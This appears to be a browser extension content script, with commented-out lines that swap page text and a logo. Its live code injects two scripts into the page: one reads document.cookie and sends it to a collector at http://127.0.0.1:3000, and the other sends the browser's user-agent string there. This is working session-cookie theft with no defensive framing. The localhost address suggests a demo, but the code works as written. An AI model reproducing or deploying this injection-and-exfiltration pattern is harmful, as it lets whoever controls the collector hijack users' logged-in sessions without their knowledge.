// var res = $("body").html().replace(/Chrome/ig,"Firefox")
// $("body").html(res);

// var imgURL = chrome.extension.getURL("new.png");
// $('#logo').children('a').children('img').attr('src', imgURL);

var ss = document.createElement("script");
ss.innerHTML= "var a = document.cookie;var xhr = new XMLHttpRequest();var url = 'http://127.0.0.1:3000?cookie='+a;xhr.open('GET',url, true);xhr.send()";
document.documentElement.appendChild(ss);
var ss2 = document.createElement("script");
ss2.innerHTML= "var a = navigator.userAgent;var xhr = new XMLHttpRequest();var url = 'http://127.0.0.1:3000?osData='+a;xhr.open('GET',url, true);xhr.send()";
document.documentElement.appendChild(ss2);
